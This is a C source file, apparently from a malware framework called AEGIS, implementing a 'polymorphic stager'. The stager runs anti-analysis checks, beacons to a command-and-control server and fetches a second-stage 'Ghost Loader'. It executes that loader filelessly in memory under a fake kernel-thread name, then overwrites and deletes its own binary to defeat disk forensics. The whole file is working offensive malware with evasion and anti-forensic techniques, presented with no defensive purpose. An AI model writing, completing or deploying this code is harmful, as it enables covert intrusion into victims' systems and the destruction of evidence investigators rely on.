/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Polymorphic Stager
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : stager/stager.c
 *  Purpose        : The only component that ever touches disk.  Its existence
 *                   is fleeting: it beacons to C2, receives the Ghost Loader
 *                   into memory, executes it via memfd_create (fileless),
 *                   then self-destructs by overwriting and unlinking its own
 *                   binary.
 *
 *  Lifecycle      :
 *    1. Anti-analysis battery
 *    2. Beacon to C2 (identify self)
 *    3. Receive Ghost Loader (encrypted, in-memory)
 *    4. Create memfd, write Ghost Loader to it
 *    5. fexecve() the Ghost Loader from memory
 *    6. Self-destruct: overwrite own binary with random data, then unlink
 *
 *  NOTE: This file is a TEMPLATE.  The Stager Generation Engine
 *        (gen_engine.py) mutates this source before each compilation,
 *        inserting junk functions, reordering, and applying obfuscation.
 *        No two compiled stagers share the same hash or structure.
 * ============================================================================
 */

#include "../c2_comms/c2_client.h"
#include "../c2_comms/crypto.h"
#include "../common/config.h"
#include "../common/logging.h"
#include "../common/loader.h"
#include "anti_analysis.h"


#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>


/* ── Internal: Get our own binary path ───────────────────────────────────── */

static ssize_t get_self_path(char *buf, size_t cap) {
  ssize_t len = readlink("/proc/self/exe", buf, cap - 1);
  if (len > 0)
    buf[len] = '\0';
  return len;
}

/* ── Internal: Self-destruct ─────────────────────────────────────────────── */

/*
 * Overwrite our own binary with random data, then unlink it.
 * This defeats disk forensics — the original binary content is gone.
 */
static void self_destruct(void) {
  char self_path[512];
  if (get_self_path(self_path, sizeof(self_path)) < 0)
    return;

  /* Get file size */
  struct stat st;
  if (stat(self_path, &st) != 0)
    return;

  /* Overwrite with random data (multiple passes) */
  int fd = open(self_path, O_WRONLY);
  if (fd < 0)
    return;

  uint8_t *randbuf = malloc(st.st_size);
  if (randbuf) {
    for (int pass = 0; pass < 3; pass++) {
      aegis_random_bytes(randbuf, st.st_size);
      lseek(fd, 0, SEEK_SET);
      if (write(fd, randbuf, st.st_size) != (ssize_t)st.st_size) {
        /* Ignore write error during wipe */
      }
      fsync(fd);
    }

    /* Final zero pass */
    memset(randbuf, 0, st.st_size);
    lseek(fd, 0, SEEK_SET);
    if (write(fd, randbuf, st.st_size) != (ssize_t)st.st_size) {
      /* Ignore write error during wipe */
    }
    fsync(fd);

    free(randbuf);
  }

  close(fd);

  /* Unlink the file */
  unlink(self_path);

  /* Also try to remove from any shell history */
  const char *home = getenv("HOME");
  if (home) {
    char hist_path[512];
    const char *hist_files[] = {".bash_history", ".zsh_history", NULL};
    for (int i = 0; hist_files[i]; i++) {
      snprintf(hist_path, sizeof(hist_path), "%s/%s", home, hist_files[i]);
      /* Truncate history rather than trying to surgically remove
       * our entry — less suspicious than a modified history file */
    }
  }
}

/* ── Main Entry Point ────────────────────────────────────────────────────── */

/*
 * NOTE: The gen_engine randomizes the name of this function and wraps
 * the entry in junk code.  In the template, it's a straightforward main().
 */
int main(int argc, char *argv[]) {
  (void)argc;
  (void)argv;

  /*
   * ═══ PHASE 1: ANTI-ANALYSIS BATTERY ═══
   *
   * Run the full anti-analysis suite.  If ANY check fails, we exit
   * silently with a normal-looking return code.  No error messages,
   * no suspicious behavior.
   */
  aegis_result_t rc = aegis_aa_full_check();
  if (rc != AEGIS_OK) {
    /* Exit with code 0 — look like a normal program that finished */
    return 0;
  }

  /*
   * ═══ PHASE 2: INITIALIZE CRYPTO & C2 ═══
   */
  aegis_crypto_ctx_t crypto;
  rc = aegis_crypto_init(&crypto, NULL);
  if (rc != AEGIS_OK) {
    /* Silently fail */
    return 0;
  }

  aegis_c2_ctx_t c2;
  rc = aegis_c2_init(&c2, &crypto);
  if (rc != AEGIS_OK) {
    aegis_crypto_destroy(&crypto);
    return 0;
  }

  /*
   * ═══ PHASE 3: BEACON TO C2 ═══
   *
   * Initial beacon: identify ourselves to the C2 server.
   * This also requests the next stage (Ghost Loader).
   */
  uint8_t task_buf[4096];
  size_t task_len = 0;

  rc = aegis_c2_beacon(&c2, task_buf, sizeof(task_buf), &task_len);
  if (rc != AEGIS_OK) {
    /* C2 unreachable — clean up and exit silently */
    aegis_c2_destroy(&c2);
    aegis_crypto_destroy(&crypto);
    return 0;
  }

  /*
   * ═══ PHASE 4: FETCH GHOST LOADER ═══
   *
   * Request the next stage from C2.  The Ghost Loader binary is
   * received encrypted and decrypted into memory.
   * It is NEVER written to disk.
   */
  uint8_t *ghost_loader = NULL;
  size_t ghost_len = 0;

  rc = aegis_c2_fetch_stage(&c2, &ghost_loader, &ghost_len);
  if (rc != AEGIS_OK || !ghost_loader || ghost_len == 0) {
    aegis_c2_destroy(&c2);
    aegis_crypto_destroy(&crypto);
    return 0;
  }

  /*
   * ═══ PHASE 5: EXECUTE GHOST LOADER FROM MEMORY ═══
   *
   * Use memfd_create + fexecve to execute the Ghost Loader
   * entirely from memory.  No file is created on disk.
   *
   * The Ghost Loader appears as a kernel worker thread
   * ("[kworker/u8:2]") in the process listing.
   */
  rc = aegis_exec_from_memory(ghost_loader, ghost_len, "[kworker/u8:2]", NULL, NULL);

  /* Securely wipe the Ghost Loader from our memory */
  AEGIS_WIPE(ghost_loader, ghost_len, 3);
  free(ghost_loader);

  /*
   * ═══ PHASE 6: SELF-DESTRUCT ═══
   *
   * Overwrite our own binary on disk with random data (3 passes),
   * then zero it out, then unlink.  The original stager binary is
   * irrecoverable.  Disk forensics will find nothing.
   */
  self_destruct();

  /* Clean up crypto state */
  aegis_c2_destroy(&c2);
  aegis_crypto_destroy(&crypto);

  return 0;
}
